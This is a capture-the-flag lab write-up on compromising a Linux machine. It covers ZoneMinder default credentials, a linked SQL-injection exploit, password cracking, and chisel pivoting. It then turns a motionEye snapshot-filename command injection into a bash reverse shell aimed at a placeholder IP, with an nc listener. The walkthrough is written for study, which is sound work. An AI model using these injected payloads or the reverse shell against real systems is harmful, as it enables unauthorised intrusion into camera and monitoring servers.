OS: Linux
Level: Easy

# Enumeration

#### Nmap

First we run a scan to look at the ports:

![[Pasted image 20260421123233.png]]

Now we scan each port individually:

```bash
sudo nmap -p22,80 -T5 -sCV -v -oN ports.specified
```

![[Pasted image 20260421123459.png]]

We see it points the IP's domain to cctv.htb, so we register it in `/etc/hosts`:

![[Pasted image 20260421123723.png]]

Now let's take a look at the site:

![[Pasted image 20260421123824.png]]

Nothing interesting in this section, so let's try the login (red button):

![[Pasted image 20260421124404.png]]

After a bit of research we learn ZoneMinder is a monitoring software, and it has default credentials, so we can try:

```text
Username -> admin
Password -> admin
```

# Exploitation

And it does give us access:

![[Pasted image 20260421124549.png]]

We see it's version 1.37.63, which is vulnerable to a time-based blind SQL injection. We can find an exploit [here](https://github.com/BridgerAlderson/CVE-2024-51482/blob/main/CVE-2024-51482.py):

The exploit shows us the admin and mark users with their respective hashes. Let's try to crack them with john, starting by putting them in a file:

![[Pasted image 20260422122707.png]]

```bash
john --wordlist=/path/to/wordlist/rockyou hash
```

Thanks to john we learn mark's password is opensesame, and we can use those same credentials to log in over SSH as `mark : opensesame`:

![[Pasted image 20260422123243.png]]

Now we start analyzing the environment we're in, beginning by enumerating the services running locally:

![[Pasted image 20260425172820.png]]

Since there are too many active services to analyze individually, and we have a stable SSH connection, we can upload chisel to enumerate the services more precisely (version and name):

We set up the chisel listener:

![[Pasted image 20260425184918.png]]

We send the connection from the victim machine:

![[Pasted image 20260425185123.png]]

Now we can run an Nmap scan through proxychains4:

![[Pasted image 20260425200805.png]]

```console
Nmap scan report for 127.0.0.1
Host is up (0.00s latency).

PORT      STATE SERVICE         VERSION
1935/tcp  open  rtmp?
3306/tcp  open  mysql           MySQL 8.0.45-0ubuntu0.24.04.1
7999/tcp  open  irdmi2?         Motion 4.7.1 Running [1] Camera
8554/tcp  open  http            IDentifier NameTracer Pro httpd
8765/tcp  open  ultraseek-http? motionEye/0.43.1b4
8888/tcp  open  http            Golang net/http server (mediamtx)
9081/tcp  open  cisco-aqos?     (JPEG camera stream)
33060/tcp open  mysqlx          MySQL X protocol listener
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

# MotionEye exploitation

We see port 8765, running motionEye/0.43.1b4. We can view this page through the chisel connection using FoxyProxy:

![[Pasted image 20260426102120.png]]

It's a camera-viewing software (Web UI) with an Authenticated RCE vulnerability. For now we can't exploit it because we don't have credentials, but after some research, the motion.conf file contains the passwords for the connection:

![[Pasted image 20260425205500.png]]

We use those credentials to log in:

![[Pasted image 20260426102323.png]]

As mentioned earlier, this version (motionEye/0.43.1b4) is vulnerable to an Authenticated RCE. We can see the PoC [here](https://github.com/advisories/GHSA-j945-qm58-4gjx):

The vulnerability lives in the setting that defines how the snapshot file names are saved for a given camera. We can perform a command injection using `$(command)`. I assume this happens because, when saving the name, bash interprets those commands and executes them:

```bash
$(mkdir /home/mark/test21).%Y-%m-%d-%H-%M-%S
```

![[Pasted image 20260426120301.png]]

Since we have a remote SSH connection, a folder named test21 should appear in the home directory:

**IMPORTANT**: If no snapshot interval is defined, we have to take the snapshot manually by going to the camera view and clicking the camera icon. That's when our code runs, because that's when the image is created and saved with the injected payload.

![[Pasted image 20260426120643.png]]

Seeing that the command injection worked, let's try to get a reverse shell:

First we set up a listener:

```bash
sudo nc -lvnp 4444
```

Now we send the payload in the image name:

```bash
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/IP/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```

We get the reverse shell:

![[Pasted image 20260426121057.png]]

We obtain both flags:

![[Pasted image 20260426123641.png]]

# Machine complete
